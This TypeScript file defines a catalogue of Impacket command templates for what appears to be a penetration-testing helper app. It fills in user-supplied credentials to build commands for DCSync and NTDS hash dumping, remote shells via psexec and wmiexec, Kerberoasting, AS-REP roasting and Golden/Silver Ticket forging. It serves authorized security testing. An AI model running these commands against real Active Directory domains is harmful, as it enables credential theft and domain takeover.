import type { Tool } from '../../types';
import { buildImpacketAuth, v } from '../../lib/auth';

export const impacketTools: Tool[] = [
  {
    id: 'secretsdump',
    name: 'secretsdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '导出密码哈希和Kerberos密钥 (SAM/LSA/NTDS)',
    commands: [
      {
        id: 'secretsdump-local',
        title: '本地 SAM 导出',
        description: '从本地注册表和文件系统导出',
        build: () => `secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`,
      },
      {
        id: 'secretsdump-remote',
        title: '远程 SAM/LSA 导出',
        build: (p) => `secretsdump.py ${buildImpacketAuth(p)}`,
      },
      {
        id: 'secretsdump-dcsync',
        title: 'DCSync 导出所有域用户哈希',
        description: '需要域管理员或复制权限',
        build: (p) => `secretsdump.py ${buildImpacketAuth(p)} -just-dc`,
      },
      {
        id: 'secretsdump-dcsync-user',
        title: 'DCSync 导出指定用户',
        build: (p) => `secretsdump.py ${buildImpacketAuth(p)} -just-dc-user ${v(p.username, 'TARGET_USER')}`,
      },
      {
        id: 'secretsdump-ntds',
        title: '导出 NTDS.dit',
        build: (p) => `secretsdump.py ${buildImpacketAuth(p)} -ntds ntds.dit -system SYSTEM -outputfile ntds_dump`,
      },
    ],
  },
  {
    id: 'psexec',
    name: 'psexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '通过服务管理器执行命令并获取交互式 shell',
    commands: [
      {
        id: 'psexec-shell',
        title: 'PSExec 交互式 Shell',
        build: (p) => `psexec.py ${buildImpacketAuth(p)}`,
      },
      {
        id: 'psexec-command',
        title: 'PSExec 执行单条命令',
        build: (p) => `psexec.py ${buildImpacketAuth(p)} "whoami"`,
      },
    ],
  },
  {
    id: 'wmiexec',
    name: 'wmiexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '通过 WMI 执行命令 (无需写入文件)',
    commands: [
      {
        id: 'wmiexec-shell',
        title: 'WMI 交互式 Shell',
        build: (p) => `wmiexec.py ${buildImpacketAuth(p)}`,
      },
      {
        id: 'wmiexec-command',
        title: 'WMI 执行单条命令',
        build: (p) => `wmiexec.py ${buildImpacketAuth(p)} "ipconfig /all"`,
      },
    ],
  },
  {
    id: 'smbexec',
    name: 'smbexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '通过 SMB 和服务管理器执行命令',
    commands: [
      {
        id: 'smbexec-shell',
        title: 'SMBExec Shell',
        build: (p) => `smbexec.py ${buildImpacketAuth(p)}`,
      },
    ],
  },
  {
    id: 'atexec',
    name: 'atexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '通过任务计划 (Task Scheduler) 执行命令',
    commands: [
      {
        id: 'atexec-command',
        title: 'ATExec 执行命令',
        build: (p) => `atexec.py ${buildImpacketAuth(p)} "systeminfo"`,
      },
    ],
  },
  {
    id: 'dcomexec',
    name: 'dcomexec',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '通过 DCOM 执行命令 (MMC20.Application)',
    commands: [
      {
        id: 'dcomexec-shell',
        title: 'DCOM Shell',
        build: (p) => `dcomexec.py ${buildImpacketAuth(p)}`,
      },
      {
        id: 'dcomexec-command',
        title: 'DCOM 执行命令',
        build: (p) => `dcomexec.py ${buildImpacketAuth(p)} "net user"`,
      },
    ],
  },
  {
    id: 'GetUserSPNs',
    name: 'GetUserSPNs',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: 'Kerberoasting - 获取服务账户的 TGS 票据',
    commands: [
      {
        id: 'getuserspns-request',
        title: '列举并请求所有 SPN 票据',
        build: (p) => `GetUserSPNs.py ${buildImpacketAuth(p)} -request`,
      },
      {
        id: 'getuserspns-output',
        title: '导出到文件供 hashcat 破解',
        build: (p) => `GetUserSPNs.py ${buildImpacketAuth(p)} -request -outputfile kerberoast_hashes.txt`,
      },
      {
        id: 'getuserspns-target',
        title: '请求指定 SPN 用户的票据',
        build: (p) => `GetUserSPNs.py ${buildImpacketAuth(p)} -request-user ${v(p.username, 'SPN_USER')}`,
      },
    ],
  },
  {
    id: 'GetNPUsers',
    name: 'GetNPUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: 'AS-REP Roasting - 获取无需预认证用户的哈希',
    commands: [
      {
        id: 'getnpusers-enum',
        title: '枚举无预认证用户',
        build: (p) => `GetNPUsers.py ${v(p.domain, 'DOMAIN')}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt`,
      },
      {
        id: 'getnpusers-dc',
        title: '从 DC 枚举 (需认证)',
        build: (p) => `GetNPUsers.py ${buildImpacketAuth(p)} -request`,
      },
    ],
  },
  {
    id: 'getTGT',
    name: 'getTGT',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '获取 Kerberos TGT 票据',
    commands: [
      {
        id: 'gettgt-password',
        title: '通过密码获取 TGT',
        build: (p) => `getTGT.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')}:${v(p.password, 'PASSWORD')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-hash',
        title: '通过 NTLM 哈希获取 TGT',
        build: (p) => `getTGT.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -hashes :${v(p.ntHash, 'NTHASH')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
      {
        id: 'gettgt-aes',
        title: '通过 AES Key 获取 TGT',
        build: (p) => `getTGT.py ${v(p.domain, 'DOMAIN')}/${v(p.username, 'USER')} -aesKey ${v(p.aesKey, 'AESKEY')} -dc-ip ${v(p.dcIP, 'DC_IP')}`,
      },
    ],
  },
  {
    id: 'ticketer',
    name: 'ticketer',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '伪造 Kerberos 票据 (Golden/Silver Ticket)',
    commands: [
      {
        id: 'ticketer-golden',
        title: 'Golden Ticket (域管理员)',
        build: (p) => `ticketer.py -nthash ${v(p.ntHash, 'KRBTGT_HASH')} -domain-sid ${v(p.domain, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} ${v(p.username, 'USER')}`,
      },
      {
        id: 'ticketer-silver',
        title: 'Silver Ticket (服务票据)',
        build: (p) => `ticketer.py -nthash ${v(p.ntHash, 'SERVICE_HASH')} -domain-sid ${v(p.domain, 'DOMAIN_SID')} -domain ${v(p.domain, 'DOMAIN')} -spn ${v(p.spn, 'SPN')} ${v(p.username, 'USER')}`,
      },
    ],
  },
  {
    id: 'mssqlclient',
    name: 'mssqlclient',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: 'MSSQL 客户端',
    commands: [
      {
        id: 'mssqlclient-connect',
        title: 'MSSQL 连接',
        build: (p) => `mssqlclient.py ${buildImpacketAuth(p)}`,
      },
      {
        id: 'mssqlclient-windows',
        title: 'MSSQL Windows 认证',
        build: (p) => `mssqlclient.py ${buildImpacketAuth(p)} -windows-auth`,
      },
    ],
  },
  {
    id: 'lookupsid',
    name: 'lookupsid',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '枚举域用户和组 (通过 SID)',
    commands: [
      {
        id: 'lookupsid-enum',
        title: '枚举域 SID',
        build: (p) => `lookupsid.py ${buildImpacketAuth(p)}`,
      },
    ],
  },
  {
    id: 'GetADUsers',
    name: 'GetADUsers',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '枚举域用户',
    commands: [
      {
        id: 'getadusers-all',
        title: '列举所有域用户',
        build: (p) => `GetADUsers.py ${buildImpacketAuth(p)} -all`,
      },
    ],
  },
  {
    id: 'findDelegation',
    name: 'findDelegation',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '查找委派账户 (非约束/约束委派)',
    commands: [
      {
        id: 'finddelegation-query',
        title: '查找委派',
        build: (p) => `findDelegation.py ${buildImpacketAuth(p)}`,
      },
    ],
  },
  {
    id: 'rpcdump',
    name: 'rpcdump',
    category: 'impacket',
    homepage: 'https://github.com/fortra/impacket',
    description: '枚举 RPC 端点和接口',
    commands: [
      {
        id: 'rpcdump-enum',
        title: 'RPC 枚举',
        build: (p) => `rpcdump.py ${buildImpacketAuth(p)}`,
      },
    ],
  },
];
